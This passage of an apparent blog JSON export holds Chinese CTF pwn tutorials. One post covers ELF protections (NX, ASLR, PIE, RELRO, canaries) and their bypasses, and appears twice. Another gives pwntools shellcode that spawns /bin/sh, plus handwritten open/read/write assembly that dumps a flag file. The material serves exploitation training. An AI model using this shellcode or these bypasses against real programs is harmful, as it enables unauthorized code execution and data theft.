RELRO（部分 RELRO）</td>\n<td>仅将 GOT 表的部分区域设为只读，GOT 表的前半部分（.got）仍可写，后半部分（.got.plt）只读</td>\n<td>较弱，可修改.got 区域</td>\n</tr>\n<tr>\n<td>Full RELRO（完全 RELRO）</td>\n<td>将整个 GOT 表设为只读，且在程序启动时提前解析所有动态链接函数（关闭延迟绑定），GOT 表无任何可写区域</td>\n<td>较强，无法修改 GOT 表</td>\n</tr>\n</tbody></table>\n<h4 id=\"2-检测方法-2\"><a href=\"#2-检测方法-2\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li><strong>工具检测</strong>：使用<code>checksec</code>，若输出中包含<code>RELRO:  Full RELRO</code>，则开启完全 RELRO；若为<code>RELRO:  Partial RELRO</code>，则开启部分 RELRO；若为<code>RELRO:  No RELRO</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路-2\"><a href=\"#3-绕过思路-2\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>RELRO 的核心是 “GOT 表只读”，绕过思路需根据保护级别区分：</p>\n<p>1.Partial RELRO：修改可写 GOT 区域</p>\n<ul>\n<li><p><strong>原理</strong>：Partial RELRO 下，GOT 表的<code>.got</code>区域（存储已解析的函数地址）仍可写，攻击者可通过栈溢出、格式化字符串等漏洞修改该区域的函数地址（如将<code>__libc_start_main</code>的 GOT 地址修改为<code>system</code>地址），实现函数劫持。</p>\n</li>\n<li><p><strong>示例</strong>：通过格式化字符串漏洞，利用<code>%n</code>将<code>__libc_start_main</code>的 GOT 表项修改为<code>system</code>地址，当程序再次调用<code>__libc_start_main</code>时，实际执行<code>system</code>。</p>\n</li>\n</ul>\n<p>2.Full RELRO：放弃 GOT 表，寻找其他漏洞</p>\n<ul>\n<li><p><strong>原理</strong>：Full RELRO 下 GOT 表完全只读，无法修改，因此需放弃 “GOT 表劫持” 思路，转而利用其他类型的漏洞或代码段中的 gadget：</p>\n<ul>\n<li><p><strong>利用栈溢出 + Ret2Gadget</strong>：通过栈溢出控制返回地址，跳转到代码段或<code>libc</code>中的 gadget 组合（如<code>pop ret</code>、<code>pop rdi ret</code>），构造<code>system(&quot;/bin/sh&quot;)</code>的调用流程。</p>\n</li>\n<li><p><strong>利用堆漏洞</strong>：若程序存在堆漏洞（如 UAF、Double Free、Off-by-One），可通过篡改堆块元数据（如<code>fd</code>、<code>bk</code>指针），实现任意地址写或控制程序执行流，无需依赖 GOT 表。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"五、Stack-Canary（栈金丝雀）：栈溢出检测\"><a href=\"#五、Stack-Canary（栈金丝雀）：栈溢出检测\" class=\"headerlink\" title=\"五、Stack Canary（栈金丝雀）：栈溢出检测\"></a>五、Stack Canary（栈金丝雀）：栈溢出检测</h3><h4 id=\"1-保护原理-4\"><a href=\"#1-保护原理-4\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>Stack Canary（栈金丝雀）是一种栈溢出检测机制，其核心逻辑是：<strong>在程序启动时，生成一个随机的 “金丝雀” 值，存储在栈帧的 rbp下方（栈溢出的必经之路）。函数返回前，程序会检查金丝雀值是否被篡改，若被篡改（说明发生栈溢出），则立即终止程序</strong>。</p>\n<h4 id=\"2-检测方法-3\"><a href=\"#2-检测方法-3\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li><strong>工具检测</strong>：使用<code>checksec</code>，若输出中包含<code>Canary:  Canary found</code>，则开启 Stack Canary；若为<code>Canary:  No canary found</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路-3\"><a href=\"#3-绕过思路-3\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>Stack Canary 的核心是 “随机值保护栈帧”，绕过思路围绕 “获取金丝雀值” 展开：</p>\n<ul>\n<li><p>泄露金丝雀值</p>\n<ul>\n<li><p><strong>原理</strong>：通过漏洞（如格式化字符串漏洞、栈溢出导致的部分内存泄露）读取栈上存储的金丝雀值，在构造栈溢出 payload 时，将泄露的金丝雀值填充到对应的位置，避免触发<code>__stack_chk_fail</code>。</p>\n</li>\n<li><p><strong>常见泄露场景</strong>：</p>\n<ul>\n<li>格式化字符串漏洞：栈上的金丝雀值可通过<code>%p</code>直接输出（需确定金丝雀在栈上的偏移）；</li>\n</ul>\n</li>\n<li><p><strong>注意事项</strong>：金丝雀值在程序每次运行时随机（结合 ASLR），因此需在同一次程序运行中完成 “泄露金丝雀 + 构造 payload 溢出”。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"gdb调试\"><a href=\"#gdb调试\" class=\"headerlink\" title=\"gdb调试\"></a>gdb调试</h2><p>  <strong>调试验证</strong>：通过<code>gdb</code>动态调试，获取关键地址，从而构造payload。</p>\n<p><code>vmmap</code>：查看进程的内存映射情况，获取各个段的地址信息。<br><code>reg rsp</code>：查看当前栈顶指针的值。（system函数调用前会检查rsp向0x10对齐）</p>\n","excerpt":"","more":"<h1 id=\"ELF-文件的常见保护机制及绕过思路\"><a href=\"#ELF-文件的常见保护机制及绕过思路\" class=\"headerlink\" title=\"ELF 文件的常见保护机制及绕过思路\"></a>ELF 文件的常见保护机制及绕过思路</h1><p>在 Pwn题目中，ELF（Executable and Linkable Format）文件通常会开启多种保护机制，以抵御常见的漏洞利用手段。理解这些保护机制的原理、检测方法及绕过思路，是成功解题的核心前提。本文将系统梳理 PWN 题目中主流的 ELF 保护机制，并详细分析对应的绕过方案。</p>\n<h2 id=\"前置须知\"><a href=\"#前置须知\" class=\"headerlink\" title=\"前置须知\"></a>前置须知</h2><ul>\n<li><code>system(&quot;sh&quot;)</code>、<code>system(&quot;/bin/sh&quot;)</code>、<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>等函数可以用来获取 shell 权限。得到shell权限之后就可以<code>cat flag</code>了。</li>\n</ul>\n<h2 id=\"检测方式\"><a href=\"#检测方式\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checksec pwn  # pwn为目标ELF文件</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果报错可以使用</span></span><br><span class=\"line\">checksec --file=pwn</span><br></pre></td></tr></table></figure>\n\n<p>输入以上代码会在终端里显示出ELF的保护机制。</p>\n<h2 id=\"主要保护机制及绕过思路\"><a href=\"#主要保护机制及绕过思路\" class=\"headerlink\" title=\"主要保护机制及绕过思路\"></a>主要保护机制及绕过思路</h2><h3 id=\"一、NX（No-eXecute）保护：栈-堆不可执行\"><a href=\"#一、NX（No-eXecute）保护：栈-堆不可执行\" class=\"headerlink\" title=\"一、NX（No-eXecute）保护：栈 &#x2F; 堆不可执行\"></a>一、NX（No-eXecute）保护：栈 &#x2F; 堆不可执行</h3><h4 id=\"1-保护原理\"><a href=\"#1-保护原理\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>NX（No-eXecute，不可执行）是最基础的 ELF 保护机制之一，其核心作用是<strong>标记栈、堆等数据区域为 “不可执行”</strong>。当程序尝试将数据区域（如栈上的 shellcode）当作代码执行时，CPU 会触发异常，直接终止程序运行，从而阻止攻击者通过注入 shellcode 并执行来获取权限。</p>\n<h4 id=\"2-检测方法\"><a href=\"#2-检测方法\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li><strong>工具检测</strong>：使用<code>checksec</code>，若输出中包含<code>NX: NX enabled</code>，则表示开启 NX 保护；若为<code>NX: NX disabled</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路\"><a href=\"#3-绕过思路\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>NX 保护的核心是 “阻止数据区域执行”，因此绕过思路围绕 “不依赖数据区域执行代码” 展开，主流方案如下：</p>\n<p>1.Ret2Libc：利用系统库函数</p>\n<ul>\n<li><p><strong>原理</strong>：程序运行时会加载<code>libc</code>（C 标准库），而<code>libc</code>中包含<code>system(&quot;/bin/sh&quot;)</code>、<code>execve</code>等可直接获取 shell 的函数。通过漏洞（如栈溢出）控制程序的返回地址，将其指向<code>libc</code>中的<code>system</code>函数地址，并构造参数（如<code>&quot;/bin/sh&quot;</code>的地址），让程序执行<code>system(&quot;/bin/sh&quot;)</code>，从而绕过 NX。</p>\n</li>\n<li><p><strong>适用场景</strong>：程序泄露了库函数地址，通过该地址可以计算出libc库的base（基址），从而构造指向libc的payload.</p>\n</li>\n</ul>\n<p>2.Ret2Shellcode（仅特定场景）</p>\n<ul>\n<li><strong>原理</strong>：写入shellcode，计算机会执行机器码。</li>\n</ul>\n<ul>\n<li><strong>适用场景</strong>：若程序存在 “可执行的数据区域”（如自定义的<code>rwx</code>权限段、未开启 NX 的部分区域），可将 shellcode 写入该区域，再通过漏洞控制返回地址跳转到 shellcode 执行。</li>\n</ul>\n<p>3.Ret2DLOPEN&#x2F;Ret2DLRESOLVE：动态链接利用</p>\n<ul>\n<li><p><strong>原理</strong>：利用 ELF 的动态链接机制，通过构造<code>dlopen</code>（加载动态库）和<code>dlsym</code>（获取库中函数地址）的调用流程，动态加载<code>libc</code>并执行<code>system</code>函数，无需提前泄露<code>libc</code>基地址。</p>\n</li>\n<li><p><strong>适用场景</strong>：程序未开启 Full RELRO 保护（GOT 表可写），且无法直接泄露<code>libc</code>地址时。</p>\n</li>\n</ul>\n<h3 id=\"二、ASLR（Address-Space-Layout-Randomization）：地址空间随机化\"><a href=\"#二、ASLR（Address-Space-Layout-Randomization）：地址空间随机化\" class=\"headerlink\" title=\"二、ASLR（Address Space Layout Randomization）：地址空间随机化\"></a>二、ASLR（Address Space Layout Randomization）：地址空间随机化</h3><h4 id=\"1-保护原理-1\"><a href=\"#1-保护原理-1\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>ASLR 是操作系统级的保护机制，其作用是<strong>在程序每次运行时，随机化 ELF 文件的代码段、数据段、堆、栈以及</strong><code>libc</code><strong>等动态库的加载地址</strong>。攻击者无法提前预测关键地址（如<code>system</code>函数、<code>&quot;/bin/sh&quot;</code>字符串地址），从而阻止 Ret2Libc 等依赖固定地址的利用方式。</p>\n<h4 id=\"2-绕过思路\"><a href=\"#2-绕过思路\" class=\"headerlink\" title=\"2. 绕过思路\"></a>2. 绕过思路</h4><p>ASLR 的核心是 “地址随机”，绕过思路围绕 “获取随机地址的具体值” 或 “利用地址固定的区域” 展开：</p>\n<p>1.信息泄露漏洞：获取关键地址</p>\n<ul>\n<li><p><strong>原理</strong>：通过程序中的信息泄露漏洞（如格式化字符串漏洞、栈溢出导致的内存泄漏、UAF 漏洞），读取内存中已加载的关键地址（如 GOT 表中<code>libc</code>函数的真实地址、栈地址、堆地址），再根据地址偏移计算出目标函数（如<code>system</code>）或字符串（如<code>&quot;/bin/sh&quot;</code>）的地址。</p>\n</li>\n<li><p><strong>常见泄露场景</strong>：</p>\n<ul>\n<li><p>格式化字符串漏洞：通过<code>%p</code>输出栈上的<code>libc</code>地址或栈地址；</p>\n</li>\n<li><p>栈溢出泄露：覆盖返回地址前，先泄露栈上保存的<code>libc</code>函数地址（如<code>__libc_start_main</code>的返回地址）；</p>\n</li>\n<li><p>GOT 表泄露：通过漏洞读取 GOT 表中已解析的<code>libc</code>函数地址（如<code>puts</code>的 GOT 地址）。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>2.地址爆破：小范围随机地址尝试</p>\n<ul>\n<li><p><strong>原理</strong>：若 ASLR 随机化的地址空间较小（如仅低 12 位随机，对应 4KB 内存页），可通过循环发送 payload，尝试所有可能的地址组合，直到命中正确地址。</p>\n</li>\n<li><p><strong>适用场景</strong>：</p>\n<ul>\n<li><p>栈地址随机化范围小（如仅栈基址低 12 位随机）；</p>\n</li>\n<li><p>程序可重复运行且无次数限制（如远程题目未限制连接次数）。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>3.利用静态地址区域</p>\n<ul>\n<li><p><strong>原理</strong>：若程序未开启 PIE 保护（代码段地址固定），则 ELF 自身的代码段、数据段地址固定，可利用这些区域中的 gadget（代码片段）或字符串构造利用链，无需依赖<code>libc</code>地址。</p>\n</li>\n<li><p><strong>适用场景</strong>：未开启 PIE 保护的程序，且程序自身存在可利用的 gadget 和字符串。</p>\n</li>\n</ul>\n<h3 id=\"三、PIE（Position-Independent-Executable）：PIE偏移\"><a href=\"#三、PIE（Position-Independent-Executable）：PIE偏移\" class=\"headerlink\" title=\"三、PIE（Position-Independent Executable）：PIE偏移\"></a>三、PIE（Position-Independent Executable）：PIE偏移</h3><h4 id=\"1-保护原理-2\"><a href=\"#1-保护原理-2\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>PIE 是 ELF 文件级的保护机制，其作用是<strong>让 ELF 文件的代码段、数据段、BSS 段等在加载时使用相对地址，而非固定地址</strong>。结合 ASLR 后，程序每次运行时，整个 ELF 文件的加载基地址会随机化，导致攻击者无法提前预测代码段中的 gadget 地址、数据段中的字符串地址等。</p>\n<h4 id=\"2-检测方法-1\"><a href=\"#2-检测方法-1\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li>使用<code>checksec</code>，若输出中包含<code>PIE:    PIE enabled</code>（或<code>PIE:    0x400000</code>等具体基址，代表部分随机），则开启 PIE；若为<code>PIE:    PIE disabled</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路-1\"><a href=\"#3-绕过思路-1\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>PIE 的核心是 “ELF 自身地址随机”，绕过思路与 ASLR 类似，需先获取 ELF 的加载基地址：</p>\n<ul>\n<li><p>泄露 ELF 基地址</p>\n<ul>\n<li><p><strong>原理</strong>：通过漏洞泄露 ELF 代码段或数据段中的某个已知偏移地址（如<code>main</code>函数地址、某个全局变量地址），再根据该地址与 ELF 基地址的偏移，计算出 ELF 的加载基地址。</p>\n</li>\n<li><p><strong>示例</strong>：若泄露的<code>main</code>函数真实地址为<code>0x55a3b7201120</code>，<code>ida</code>显示<code>main</code>的偏移为<code>0x1120</code>，则 ELF 基地址为<code>0x55a3b7201120 - 0x1120 = 0x55a3b7200000</code>。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"四、RELRO（Relocation-Read-Only）：重定位表只读保护\"><a href=\"#四、RELRO（Relocation-Read-Only）：重定位表只读保护\" class=\"headerlink\" title=\"四、RELRO（Relocation Read-Only）：重定位表只读保护\"></a>四、RELRO（Relocation Read-Only）：重定位表只读保护</h3><h4 id=\"1-保护原理-3\"><a href=\"#1-保护原理-3\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>RELRO 通过限制 ELF 的 GOT（Global Offset Table，全局偏移表）和 PLT（Procedure Linkage Table，过程链接表）的可写性，防止攻击者通过修改 GOT 表来劫持函数执行流程（如将<code>puts</code>的 GOT 表项修改为<code>system</code>地址）。RELRO 分为两种级别：</p>\n<table>\n<thead>\n<tr>\n<th>保护级别</th>\n<th>原理</th>\n<th>防护强度</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Partial RELRO（部分 RELRO）</td>\n<td>仅将 GOT 表的部分区域设为只读，GOT 表的前半部分（.got）仍可写，后半部分（.got.plt）只读</td>\n<td>较弱，可修改.got 区域</td>\n</tr>\n<tr>\n<td>Full RELRO（完全 RELRO）</td>\n<td>将整个 GOT 表设为只读，且在程序启动时提前解析所有动态链接函数（关闭延迟绑定），GOT 表无任何可写区域</td>\n<td>较强，无法修改 GOT 表</td>\n</tr>\n</tbody></table>\n<h4 id=\"2-检测方法-2\"><a href=\"#2-检测方法-2\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li><strong>工具检测</strong>：使用<code>checksec</code>，若输出中包含<code>RELRO:  Full RELRO</code>，则开启完全 RELRO；若为<code>RELRO:  Partial RELRO</code>，则开启部分 RELRO；若为<code>RELRO:  No RELRO</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路-2\"><a href=\"#3-绕过思路-2\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>RELRO 的核心是 “GOT 表只读”，绕过思路需根据保护级别区分：</p>\n<p>1.Partial RELRO：修改可写 GOT 区域</p>\n<ul>\n<li><p><strong>原理</strong>：Partial RELRO 下，GOT 表的<code>.got</code>区域（存储已解析的函数地址）仍可写，攻击者可通过栈溢出、格式化字符串等漏洞修改该区域的函数地址（如将<code>__libc_start_main</code>的 GOT 地址修改为<code>system</code>地址），实现函数劫持。</p>\n</li>\n<li><p><strong>示例</strong>：通过格式化字符串漏洞，利用<code>%n</code>将<code>__libc_start_main</code>的 GOT 表项修改为<code>system</code>地址，当程序再次调用<code>__libc_start_main</code>时，实际执行<code>system</code>。</p>\n</li>\n</ul>\n<p>2.Full RELRO：放弃 GOT 表，寻找其他漏洞</p>\n<ul>\n<li><p><strong>原理</strong>：Full RELRO 下 GOT 表完全只读，无法修改，因此需放弃 “GOT 表劫持” 思路，转而利用其他类型的漏洞或代码段中的 gadget：</p>\n<ul>\n<li><p><strong>利用栈溢出 + Ret2Gadget</strong>：通过栈溢出控制返回地址，跳转到代码段或<code>libc</code>中的 gadget 组合（如<code>pop ret</code>、<code>pop rdi ret</code>），构造<code>system(&quot;/bin/sh&quot;)</code>的调用流程。</p>\n</li>\n<li><p><strong>利用堆漏洞</strong>：若程序存在堆漏洞（如 UAF、Double Free、Off-by-One），可通过篡改堆块元数据（如<code>fd</code>、<code>bk</code>指针），实现任意地址写或控制程序执行流，无需依赖 GOT 表。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"五、Stack-Canary（栈金丝雀）：栈溢出检测\"><a href=\"#五、Stack-Canary（栈金丝雀）：栈溢出检测\" class=\"headerlink\" title=\"五、Stack Canary（栈金丝雀）：栈溢出检测\"></a>五、Stack Canary（栈金丝雀）：栈溢出检测</h3><h4 id=\"1-保护原理-4\"><a href=\"#1-保护原理-4\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>Stack Canary（栈金丝雀）是一种栈溢出检测机制，其核心逻辑是：<strong>在程序启动时，生成一个随机的 “金丝雀” 值，存储在栈帧的 rbp下方（栈溢出的必经之路）。函数返回前，程序会检查金丝雀值是否被篡改，若被篡改（说明发生栈溢出），则立即终止程序</strong>。</p>\n<h4 id=\"2-检测方法-3\"><a href=\"#2-检测方法-3\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li><strong>工具检测</strong>：使用<code>checksec</code>，若输出中包含<code>Canary:  Canary found</code>，则开启 Stack Canary；若为<code>Canary:  No canary found</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路-3\"><a href=\"#3-绕过思路-3\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>Stack Canary 的核心是 “随机值保护栈帧”，绕过思路围绕 “获取金丝雀值” 展开：</p>\n<ul>\n<li><p>泄露金丝雀值</p>\n<ul>\n<li><p><strong>原理</strong>：通过漏洞（如格式化字符串漏洞、栈溢出导致的部分内存泄露）读取栈上存储的金丝雀值，在构造栈溢出 payload 时，将泄露的金丝雀值填充到对应的位置，避免触发<code>__stack_chk_fail</code>。</p>\n</li>\n<li><p><strong>常见泄露场景</strong>：</p>\n<ul>\n<li>格式化字符串漏洞：栈上的金丝雀值可通过<code>%p</code>直接输出（需确定金丝雀在栈上的偏移）；</li>\n</ul>\n</li>\n<li><p><strong>注意事项</strong>：金丝雀值在程序每次运行时随机（结合 ASLR），因此需在同一次程序运行中完成 “泄露金丝雀 + 构造 payload 溢出”。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"gdb调试\"><a href=\"#gdb调试\" class=\"headerlink\" title=\"gdb调试\"></a>gdb调试</h2><p>  <strong>调试验证</strong>：通过<code>gdb</code>动态调试，获取关键地址，从而构造payload。</p>\n<p><code>vmmap</code>：查看进程的内存映射情况，获取各个段的地址信息。<br><code>reg rsp</code>：查看当前栈顶指针的值。（system函数调用前会检查rsp向0x10对齐）</p>\n"},{"title":"Day 03 shellcode之：板子做pwn,易如反掌","date":"2025-08-28T16:00:00.000Z","top_img":"/images/background/狐妖/02.jpg","cover":"/images/background/狐妖/1.jpg","_content":"# shellcraft杂谈\n\n## 1. 什么时候考虑写 shellcode？\n\n在 pwn 题里，是否写 shellcode一般要看是否能满足以下条件：\n\n**能把*可控字节*放进一块*可执行内存***：如程序把输入放到栈/堆且该段 **可执行（NX 关闭）**；或能把内存权限改为可执行（有`mprotect`, `mmap`函数）。\n\n所以写入shellcode前要先*检查*一下，确保shellcode写入到**可执行内存**中。   \n若以上条件不满足，更适合探索其他路线。\n\n---\n\n## 2.  `shellcraft` 的三个常用组件\n\n `shellcraft` 是`pwntools` 里的一个模块（**板子**），会根据体系结构生成汇编片段。以下均以x64架构为例。\n```python\ncontext.arch = 'amd64'\n```\n\n### 2.1 `shellcraft.sh()`\n\n* 作用：构造执行 `execve(\"/bin/sh\", 0, 0)` 的 shellcode。\n* 适用：**允许 59 号系统调用**、无 seccomp 限制。\n* 用法示例：\n\n```python\nshellcode = shellcraft.sh()          # execve(\"/bin/sh\", NULL, NULL)\n# asm()函数将汇编翻译成机器码，shellcode都需要转换成机器码再写入内存：\n payload = asm(shellcode)    # 这句默认都需要，下面就不写了\n```\n\n\n### 2.2 `shellcraft.pushstr()`\n\n* 作用：把一个以 `\\x00` 结尾的字符串压到栈上，再作为系统调用参数。\n* 典型写法：\n\n```python\nshellcode = shellcraft.pushstr(b\"/bin/sh\\x00\")  # 把字符串压栈，rsp 指向它\nshellcode += shellcraft.mov('rdi', 'rsp')        # rdi = 指向 \"/bin/sh\"\n```\n* 对应汇编：\n```python\n    push 0x0068732f6e69622f   ; \"/bin/sh\\x00\"\n    mov rdi, rsp 或者 pop rdi    ; rdi 指向栈顶的字符串\n```\n\n### 2.3 `shellcraft.cat(\"./flag\")`\n\n* 作用：禁用59号execve()系统调用时，一条龙 **打开文件→读→写到 stdout**，非常适合作为 **orw** 的快捷实现（open->read->write）。\n* 用法示例：\n\n```python\nsc = shellcraft.cat(\"./flag\")   # open(\"./flag\", O); read(); write(1, buf, 0x50)\n```\n\n* 优点：不用自己管缓冲区循环，能快速验证 orw 思路。\n* 注意：若沙箱禁了 `open` 而只放行 `openat`，需要改用 `shellcraft.openat(...)` 或手写 syscall。\n\n---\n\n## 3. orw（open/read/write）汇编实现：  \n### 前置芝士：😋\n* 关于文件描述符（句柄）：\n  * 文件描述符是一个非负整数，用于标识一个打开的文件或其他输入输出资源。\n  * 每个进程都有自己的文件描述符表，记录着所有打开文件的信息。\n  * 文件描述符从 0 开始分配，通常 0、1、2 分别对应标准输入、标准输出和标准错误输出。   \n* 关于库函数：\n  * `open（file,mode）`: 以mode模式打开file文件（带路径），返回文件描述符。  \n    mode: 0->只读、1->只写、2->读写。\n  * `read（fd,buf,count）`: 从文件描述符 fd 读取数据到 buf，最多读取 count 字节。\n  * `write（fd,buf,count）`: 向文件描述符 fd 写入 buf 中的数据，最多写 count 字节。\n\n###  orw实现：\n\n* 当 **59（`execve`）被禁**，`/bin/sh` 起不来，就走文件读写：\n\n  1. **open / openat** 打开 `./flag`（或题目指定路径），获得 fd。\n  2. **read** 把内容读到可控缓冲区（通常是栈上，rsp）。\n  3. **write** 把缓冲区写到 `stdout`（fd=1）返回给我们。\n\n* exp：  \n```python\n  shellcode =asm(shellcraft.pushstr(\"./flag\")+\"mov rdi,rsp;push 2;pop rax;xor rsi,rsi;syscall\")#open\n  shellcode+=asm(\"mov rdi,rax\")#将返回值放入read的一参数\n  shellcode+=asm(\"mov rsi,rsp;push 0x50;pop rdx;push 0;pop rax;syscall\")#read\n  shellcode+=asm(\"push 1;pop rax;push 1;pop rdi;syscall\")\n```\n因为不同题目的限制不一样，shellcraft可能不适用，所以建议各位大爹手写汇编🥰\n\n\n\n## 4. 如果常用的被禁了😭\n\n`open` 被禁但 **`openat`(257)** 可用，使用`shellcraft.openat`\n\n `read`被禁了用`sendfile` ，把 `flag` 直接送到 `stdout`。\n\n\n---\n\n## 5. 调试与实战小贴士\n\n* **先本地跑**：用 `process()` + `gdb.attach()`；看 seccomp（如题给 `seccomp-tools` 的输出）到底放了哪些 syscall。\n* **RWX 获取**：NX 开着就用 ROP 先 `mmap`/`mprotect`\n\n* **极简 loader**：若输入长度受限，先丢一个 “读更多字节到某地址再跳转” 的小 loader，然后把完整 orw shellcode 流进去。\n\n---\n\n## 6. 小结（拿题就能套）\n\n* **能 `execve` → `shellcraft.sh()`**，最快起 shell。\n* **禁 59 → 走 orw**：优先 `shellcraft.cat(\"./flag\")`；`open` 被禁就换 `openat`；再不行找 **已存在 fd** 或 `sendfile`。\n* 熟悉 `pushstr` 的用法，你就能自由拼接口参数，快速写出自定义 syscall 组合。\n\n","source":"_posts/Day 03 shellcode之：板子做pwn,易如反掌.md","raw":"---\ntitle: Day 03 shellcode之：板子做pwn,易如反掌\ndate: 2025-08-29\ntags: \n  - ubuntu\n  - pwntools\n  - 汇编\ncategories: pwn\ntop_img: /images/background/狐妖/02.jpg\ncover: /images/background/狐妖/1.jpg\n---\n# shellcraft杂谈\n\n## 1. 什么时候考虑写 shellcode？\n\n在 pwn 题里，是否写 shellcode一般要看是否能满足以下条件：\n\n**能把*可控字节*放进一块*可执行内存***：如程序把输入放到栈/堆且该段 **可执行（NX 关闭）**；或能把内存权限改为可执行（有`mprotect`, `mmap`函数）。\n\n所以写入shellcode前要先*检查*一下，确保shellcode写入到**可执行内存**中。   \n若以上条件不满足，更适合探索其他路线。\n\n---\n\n## 2.  `shellcraft` 的三个常用组件\n\n `shellcraft` 是`pwntools` 里的一个模块（**板子**），会根据体系结构生成汇编片段。以下均以x64架构为例。\n```python\ncontext.arch = 'amd64'\n```\n\n### 2.1 `shellcraft.sh()`\n\n* 作用：构造执行 `execve(\"/bin/sh\", 0, 0)` 的 shellcode。\n* 适用：**允许 59 号系统调用**、无 seccomp 限制。\n* 用法示例：\n\n```python\nshellcode = shellcraft.sh()          # execve(\"/bin/sh\", NULL, NULL)\n# asm()函数将汇编翻译成机器码，shellcode都需要转换成机器码再写入内存：\n payload = asm(shellcode)    # 这句默认都需要，下面就不写了\n```\n\n\n### 2.2 `shellcraft.pushstr()`\n\n* 作用：把一个以 `\\x00` 结尾的字符串压到栈上，再作为系统调用参数。\n* 典型写法：\n\n```python\nshellcode = shellcraft.pushstr(b\"/bin/sh\\x00\")  # 把字符串压栈，rsp 指向它\nshellcode += shellcraft.mov('rdi', 'rsp')        # rdi = 指向 \"/bin/sh\"\n```\n* 对应汇编：\n```python\n    push 0x0068732f6e69622f   ; \"/bin/sh\\x00\"\n    mov rdi, rsp 或者 pop rdi    ; rdi 指向栈顶的字符串\n```\n\n### 2.3 `shellcraft.cat(\"./flag\")`\n\n* 作用：禁用59号execve()系统调用时，一条龙 **打开文件→读→写到 stdout**，非常适合作为 **orw** 的快捷实现（open->read->write）。\n* 用法示例：\n\n```python\nsc = shellcraft.cat(\"./flag\")   # open(\"./flag\", O); read(); write(1, buf, 0x50)\n```\n\n* 优点：不用自己管缓冲区循环，能快速验证 orw 思路。\n* 注意：若沙箱禁了 `open` 而只放行 `openat`，需要改用 `shellcraft.openat(...)` 或手写 syscall。\n\n---\n\n## 3. orw（open/read/write）汇编实现：  \n### 前置芝士：😋\n* 关于文件描述符（句柄）：\n  * 文件描述符是一个非负整数，用于标识一个打开的文件或其他输入输出资源。\n  * 每个进程都有自己的文件描述符表，记录着所有打开文件的信息。\n  * 文件描述符从 0 开始分配，通常 0、1、2 分别对应标准输入、标准输出和标准错误输出。   \n* 关于库函数：\n  * `open（file,mode）`: 以mode模式打开file文件（带路径），返回文件描述符。  \n    mode: 0->只读、1->只写、2->读写。\n  * `read（fd,buf,count）`: 从文件描述符 fd 读取数据到 buf，最多读取 count 字节。\n  * `write（fd,buf,count）`: 向文件描述符 fd 写入 buf 中的数据，最多写 count 字节。\n\n###  orw实现：\n\n* 当 **59（`execve`）被禁**，`/bin/sh` 起不来，就走文件读写：\n\n  1. **open / openat** 打开 `./flag`（或题目指定路径），获得 fd。\n  2. **read** 把内容读到可控缓冲区（通常是栈上，rsp）。\n  3. **write** 把缓冲区写到 `stdout`（fd=1）返回给我们。\n\n* exp：  \n```python\n  shellcode =asm(shellcraft.pushstr(\"./flag\")+\"mov rdi,rsp;push 2;pop rax;xor rsi,rsi;syscall\")#open\n  shellcode+=asm(\"mov rdi,rax\")#将返回值放入read的一参数\n  shellcode+=asm(\"mov rsi,rsp;push 0x50;pop rdx;push 0;pop rax;syscall\")#read\n  shellcode+=asm(\"push 1;pop rax;push 1;pop rdi;syscall\")\n```\n因为不同题目的限制不一样，shellcraft可能不适用，所以建议各位大爹手写汇编🥰\n\n\n\n## 4. 如果常用的被禁了😭\n\n`open` 被禁但 **`openat`(257)** 可用，使用`shellcraft.openat`\n\n `read`被禁了用`sendfile` ，把 `flag` 直接送到 `stdout`。\n\n\n---\n\n## 5. 调试与实战小贴士\n\n* **先本地跑**：用 `process()` + `gdb.attach()`；看 seccomp（如题给 `seccomp-tools` 的输出）到底放了哪些 syscall。\n* **RWX 获取**：NX 开着就用 ROP 先 `mmap`/`mprotect`\n\n* **极简 loader**：若输入长度受限，先丢一个 “读更多字节到某地址再跳转” 的小 loader，然后把完整 orw shellcode 流进去。\n\n---\n\n## 6. 小结（拿题就能套）\n\n* **能 `execve` → 